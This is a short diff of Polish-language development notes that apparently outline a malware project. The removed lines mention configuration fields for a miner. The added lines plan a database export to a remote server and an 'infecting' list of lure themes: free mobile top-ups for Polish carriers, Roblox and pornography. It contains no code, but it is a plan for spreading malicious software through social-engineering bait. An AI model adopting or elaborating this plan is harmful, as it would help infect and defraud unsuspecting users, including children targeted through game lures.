@@ -9,7 +9,11 @@ tworzenie default pliku konfiguracyjnego do wszystkiego lokalnie a po polaczeniu
 
 serwer musi odpowiadac pakietami json najlepiej zaszyfrowanymi
 
+ETAP TESTÓW:
+- EKSPORT BAZY DANYCH NA SERVER 5V.PL
+- PEŁEN TEST APLIKACJI
 
-Pola pliku konfiguaryjnego
-- do minera 
-- 
+INFEKOWANIE:
+- DOŁADOWANIA ORANGE/PLAY/PLUS/TMOBILE
+- ROXBLOX
+- PORNO
